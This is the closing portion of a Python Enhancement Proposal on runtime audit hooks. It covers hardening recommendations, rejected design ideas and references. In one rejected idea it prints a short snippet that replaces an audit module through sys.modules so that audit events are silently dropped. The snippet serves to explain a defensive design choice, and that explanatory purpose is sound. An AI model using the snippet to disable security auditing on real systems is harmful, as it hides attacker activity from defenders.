<p>Analysis using the <tt class="docutils literal">performance</tt> tool shows no significant impact,
with the vast majority of benchmarks showing between 1.05x faster to
1.05x slower.</p>
<p>In our opinion, the performance impact of the set of auditing points
described in this PEP is negligible.</p>
</div>
<div class="section" id="recommendations">
<h1><a class="toc-backref" href="#id42">Recommendations</a></h1>
<p>Specific recommendations are difficult to make, as the ideal
configuration for any environment will depend on the user's ability to
manage, monitor, and respond to activity on their own network. However,
many of the proposals here do not appear to be of value without deeper
illustration. This section provides recommendations using the terms
<strong>should</strong> (or <strong>should not</strong>), indicating that we consider it dangerous
to ignore the advice, and <strong>may</strong>, indicating that for the advice ought
to be considered for high value systems. The term <strong>sysadmins</strong> refers
to whoever is responsible for deploying Python throughout your network;
different organizations may have an alternative title for the
responsible people.</p>
<p>Sysadmins <strong>should</strong> build their own entry point, likely starting from
the <tt class="docutils literal">spython</tt> source, and directly interface with the security systems
available in their environment. The more tightly integrated, the less
likely a vulnerability will be found allowing an attacker to bypass
those systems. In particular, the entry point <strong>should not</strong> obtain any
settings from the current environment, such as environment variables,
unless those settings are otherwise protected from modification.</p>
<p>Audit messages <strong>should not</strong> be written to a local file. The
<tt class="docutils literal">spython</tt> entry point does this for example and testing purposes. On
production machines, tools such as ETW <a class="footnote-reference" href="#id26" id="id17">[7]</a> or auditd <a class="footnote-reference" href="#id31" id="id18">[12]</a> that are
intended for this purpose should be used.</p>
<p>The default <tt class="docutils literal">python</tt> entry point <strong>should not</strong> be deployed to
production machines, but could be given to developers to use and test
Python on non-production machines. Sysadmins <strong>may</strong> consider deploying
a less restrictive version of their entry point to developer machines,
since any system connected to your network is a potential target.
Sysadmins <strong>may</strong> deploy their own entry point as <tt class="docutils literal">python</tt> to obscure
the fact that extra auditing is being included.</p>
<p>Python deployments <strong>should</strong> be made read-only using any available
platform functionality after deployment and during use.</p>
<p>On platforms that support it, sysadmins <strong>should</strong> include signatures
for every file in a Python deployment, ideally verified using a private
certificate. For example, Windows supports embedding signatures in
executable files and using catalogs for others, and can use DeviceGuard
<a class="footnote-reference" href="#id23" id="id19">[4]</a> to validate signatures either automatically or using an
<tt class="docutils literal">open_for_import</tt> hook.</p>
<p>Sysadmins <strong>should</strong> log as many audited events as possible, and
<strong>should</strong> copy logs off of local machines frequently. Even if logs are
not being constantly monitored for suspicious activity, once an attack
is detected it is too late to enable auditing. Audit hooks <strong>should
not</strong> attempt to preemptively filter events, as even benign events are
useful when analyzing the progress of an attack. (Watch the &quot;No Easy
Breach&quot; video under <a class="reference internal" href="#further-reading">Further Reading</a> for a deeper look at this side of
things.)</p>
<p>Most actions <strong>should not</strong> be aborted if they could ever occur during
normal use or if preventing them will encourage attackers to work around
them. As described earlier, awareness is a higher priority than
prevention. Sysadmins <strong>may</strong> audit their Python code and abort
operations that are known to never be used deliberately.</p>
<p>Audit hooks <strong>should</strong> write events to logs before attempting to abort.
As discussed earlier, it is more important to record malicious actions
than to prevent them.</p>
<p>Sysadmins <strong>should</strong> identify correlations between events, as a change
to correlated events may indicate misuse. For example, module imports
will typically trigger the <tt class="docutils literal">import</tt> auditing event, followed by an
<tt class="docutils literal">open_for_import</tt> call and usually a <tt class="docutils literal">compile</tt> event. Attempts to
bypass auditing will often suppress some but not all of these events. So
if the log contains <tt class="docutils literal">import</tt> events but not <tt class="docutils literal">compile</tt> events,
investigation may be necessary.</p>
<p>The first audit hook <strong>should</strong> be set in C code before
<tt class="docutils literal">Py_Initialize</tt> is called, and that hook <strong>should</strong> unconditionally
abort the <tt class="docutils literal">sys.addloghook</tt> event. The Python interface is primarily
intended for testing and development.</p>
<p>To prevent audit hooks being added on non-production machines, an entry
point <strong>may</strong> add an audit hook that aborts the <tt class="docutils literal">sys.addloghook</tt> event
but otherwise does nothing.</p>
<p>On production machines, a non-validating <tt class="docutils literal">open_for_import</tt> hook
<strong>may</strong> be set in C code before <tt class="docutils literal">Py_Initialize</tt> is called. This
prevents later code from overriding the hook, however, logging the
<tt class="docutils literal">setopenforexecutehandler</tt> event is useful since no code should ever
need to call it. Using at least the sample <tt class="docutils literal">open_for_import</tt> hook
implementation from <tt class="docutils literal">spython</tt> is recommended.</p>
<p>Since <tt class="docutils literal">importlib</tt>'s use of <tt class="docutils literal">open_for_import</tt> may be easily bypassed
with monkeypatching, an audit hook <strong>should</strong> be used to detect
attribute changes on type objects.</p>
<p>[TODO: more good advice; less bad advice]</p>
</div>
<div class="section" id="rejected-ideas">
<h1><a class="toc-backref" href="#id43">Rejected Ideas</a></h1>
<div class="section" id="separate-module-for-audit-hooks">
<h2><a class="toc-backref" href="#id44">Separate module for audit hooks</a></h2>
<p>The proposal is to add a new module for audit hooks, hypothetically
<tt class="docutils literal">audit</tt>. This would separate the API and implementation from the
<tt class="docutils literal">sys</tt> module, and allow naming the C functions <tt class="docutils literal">PyAudit_AddHook</tt> and
<tt class="docutils literal">PyAudit_Audit</tt> rather than the current variations.</p>
<p>Any such module would need to be a built-in module that is guaranteed to
always be present. The nature of these hooks is that they must be
callable without condition, as any conditional imports or calls provide
more opportunities to intercept and suppress or modify events.</p>
<p>Given its nature as one of the most core modules, the <tt class="docutils literal">sys</tt> module is
somewhat protected against module shadowing attacks. Replacing <tt class="docutils literal">sys</tt>
with a sufficiently functional module that the application can still run
is a much more complicated task than replacing a module with only one
function of interest. An attacker that has the ability to shadow the
<tt class="docutils literal">sys</tt> module is already capable of running arbitrary code from files,
whereas an <tt class="docutils literal">audit</tt> module can be replaced with a single statement:</p>
<pre class="literal-block">
import sys; sys.modules['audit'] = type('audit', (object,),
    {'audit': lambda *a: None, 'addhook': lambda *a: None})
</pre>
<p>Multiple layers of protection already exist for monkey patching attacks
against either <tt class="docutils literal">sys</tt> or <tt class="docutils literal">audit</tt>, but assignments or insertions to
<tt class="docutils literal">sys.modules</tt> are not audited.</p>
<p>This idea is rejected because it makes substituting <tt class="docutils literal">audit</tt> calls
throughout all callers near trivial.</p>
</div>
<div class="section" id="flag-in-sys-flags-to-indicate-secure-mode">
<h2><a class="toc-backref" href="#id45">Flag in sys.flags to indicate &quot;secure&quot; mode</a></h2>
<p>The proposal is to add a value in <tt class="docutils literal">sys.flags</tt> to indicate when Python
is running in a &quot;secure&quot; mode. This would allow applications to detect
when some features are enabled and modify their behaviour appropriately.</p>
<p>Currently there are no guarantees made about security by this PEP - this
section is the first time the word &quot;secure&quot; has been used. Security
<strong>transparency</strong> does not result in any changed behaviour, so there is
no appropriate reason for applications to modify their behaviour.</p>
<p>Both application-level APIs <tt class="docutils literal">sys.audit</tt> and <tt class="docutils literal">_imp.open_for_import</tt>
are always present and functional, regardless of whether the regular
<tt class="docutils literal">python</tt> entry point or some alternative entry point is used. Callers
cannot determine whether any hooks have been added (except by performing
side-channel analysis), nor do they need to. The calls should be fast
enough that callers do not need to avoid them, and the sysadmin is
responsible for ensuring their added hooks are fast enough to not affect
application performance.</p>
<p>The argument that this is &quot;security by obscurity&quot; is valid, but
irrelevant. Security by obscurity is only an issue when there are no
other protective mechanisms; obscurity as the first step in avoiding
attack is strongly recommended (see <a class="reference external" href="https://danielmiessler.com/study/security-by-obscurity/">this article</a> for
discussion).</p>
<p>This idea is rejected because there are no appropriate reasons for an
application to change its behaviour based on whether these APIs are in
use.</p>
</div>
</div>
<div class="section" id="further-reading">
<h1><a class="toc-backref" href="#id46">Further Reading</a></h1>
<dl class="docutils">
<dt><strong>Redefining Malware: When Old Terms Pose New Threats</strong></dt>
<dd><p class="first">By Aviv Raff for SecurityWeek, 29th January 2014</p>
<p>This article, and those linked by it, are high-level summaries of the rise of
APTs and the differences from &quot;traditional&quot; malware.</p>
<p class="last"><a class="reference external" href="http://www.securityweek.com/redefining-malware-when-old-terms-pose-new-threats">http://www.securityweek.com/redefining-malware-when-old-terms-pose-new-threats</a></p>
</dd>
<dt><strong>Anatomy of a Cyber Attack</strong></dt>
<dd><p class="first">By FireEye, accessed 23rd August 2017</p>
<p>A summary of the techniques used by APTs, and links to a number of relevant
whitepapers.</p>
<p class="last"><a class="reference external" href="https://www.fireeye.com/current-threats/anatomy-of-a-cyber-attack.html">https://www.fireeye.com/current-threats/anatomy-of-a-cyber-attack.html</a></p>
</dd>
<dt><strong>Automated Traffic Log Analysis: A Must Have for Advanced Threat Protection</strong></dt>
<dd><p class="first">By Aviv Raff for SecurityWeek, 8th May 2014</p>
<p>High-level summary of the value of detailed logging and automatic analysis.</p>
<p class="last"><a class="reference external" href="http://www.securityweek.com/automated-traffic-log-analysis-must-have-advanced-threat-protection">http://www.securityweek.com/automated-traffic-log-analysis-must-have-advanced-threat-protection</a></p>
</dd>
<dt><strong>No Easy Breach: Challenges and Lessons Learned from an Epic Investigation</strong></dt>
<dd><p class="first">Video presented by Matt Dunwoody and Nick Carr for Mandiant at SchmooCon 2016</p>
<p>Detailed walkthrough of the processes and tools used in detecting and removing
an APT.</p>
<p class="last"><a class="reference external" href="https://archive.org/details/No_Easy_Breach">https://archive.org/details/No_Easy_Breach</a></p>
</dd>
<dt><strong>Disrupting Nation State Hackers</strong></dt>
<dd><p class="first">Video presented by Rob Joyce for the NSA at USENIX Enigma 2016</p>
<p>Good security practices, capabilities and recommendations from the chief of
NSA's Tailored Access Operation.</p>
<p class="last"><a class="reference external" href="https://www.youtube.com/watch?v=bDJb8WOJYdA">https://www.youtube.com/watch?v=bDJb8WOJYdA</a></p>
</dd>
</dl>
</div>
<div class="section" id="references">
<h1><a class="toc-backref" href="#id47">References</a></h1>
<table class="docutils footnote" frame="void" id="id20" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label"><a class="fn-backref" href="#id1">[1]</a></td><td>Assume Breach Mindset, <a class="reference external" href="http://asian-power.com/node/11144">http://asian-power.com/node/11144</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id21" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label"><a class="fn-backref" href="#id2">[2]</a></td><td>PowerShell Loves the Blue Team, also known as Scripting Security and
Protection Advances in Windows 10, <a class="reference external" href="https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/">https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id22" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label"><a class="fn-backref" href="#id3">[3]</a></td><td><a class="reference external" href="https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html">https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id23" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label">[4]</td><td><em>(<a class="fn-backref" href="#id4">1</a>, <a class="fn-backref" href="#id16">2</a>, <a class="fn-backref" href="#id19">3</a>)</em> <a class="reference external" href="https://aka.ms/deviceguard">https://aka.ms/deviceguard</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id24" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label"><a class="fn-backref" href="#id5">[5]</a></td><td>AMSI, <a class="reference external" href="https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id25" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label"><a class="fn-backref" href="#id6">[6]</a></td><td>Persistent Zone Identifiers, <a class="reference external" href="https://msdn.microsoft.com/en-us/library/ms537021(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/ms537021(v=vs.85).aspx</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id26" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label">[7]</td><td><em>(<a class="fn-backref" href="#id7">1</a>, <a class="fn-backref" href="#id17">2</a>)</em> Event tracing, <a class="reference external" href="https://msdn.microsoft.com/en-us/library/aa363668(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/aa363668(v=vs.85).aspx</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id27" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label"><a class="fn-backref" href="#id8">[8]</a></td><td><a class="reference external" href="https://www.gnupg.org/">https://www.gnupg.org/</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id28" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label"><a class="fn-backref" href="#id9">[9]</a></td><td><a class="reference external" href="https://www.systutorials.com/docs/linux/man/3-sd_journal_send/">https://www.systutorials.com/docs/linux/man/3-sd_journal_send/</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id29" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label">[10]</td><td><em>(<a class="fn-backref" href="#id10">1</a>, <a class="fn-backref" href="#id14">2</a>)</em> <a class="reference external" href="http://www.trustedbsd.org/openbsm.html">http://www.trustedbsd.org/openbsm.html</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id30" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label">[11]</td><td><em>(<a class="fn-backref" href="#id11">1</a>, <a class="fn-backref" href="#id15">2</a>)</em> <a class="reference external" href="https://linux.die.net/man/3/syslog">https://linux.die.net/man/3/syslog</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id31" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label">[12]</td><td><em>(<a class="fn-backref" href="#id12">1</a>, <a class="fn-backref" href="#id18">2</a>)</em> <a class="reference external" href="http://security.blogoverflow.com/2013/01/a-brief-introduction-to-auditd/">http://security.blogoverflow.com/2013/01/a-brief-introduction-to-auditd/</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id32" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label"><a class="fn-backref" href="#id13">[13]</a></td><td>SELinux access decisions <a class="reference external" href="http://man7.org/linux/man-pages/man3/avc_entry_ref_init.3.html">http://man7.org/linux/man-pages/man3/avc_entry_ref_init.3.html</a></td></tr>
</tbody>
</table>
</div>
<div class="section" id="acknowledgments">
<h1><a class="toc-backref" href="#id48">Acknowledgments</a></h1>
<p>Thanks to all the people from Microsoft involved in helping make the
Python runtime safer for production use, and especially to James Powell
for doing much of the initial research, analysis and implementation, Lee
Holmes for invaluable insights into the info-sec field and PowerShell's
responses, and Brett Cannon for the restraining and grounding
discussions.</p>
</div>
<div class="section" id="copyright">
<h1><a class="toc-backref" href="#id49">Copyright</a></h1>
<p>Copyright (c) 2017 by Microsoft Corporation. This material may be
distributed only subject to the terms and conditions set forth in the
Open Publication License, v1.0 or later (the latest version is presently
available at <a class="reference external" href="http://www.opencontent.org/openpub/">http://www.opencontent.org/openpub/</a>).</p>
</div>

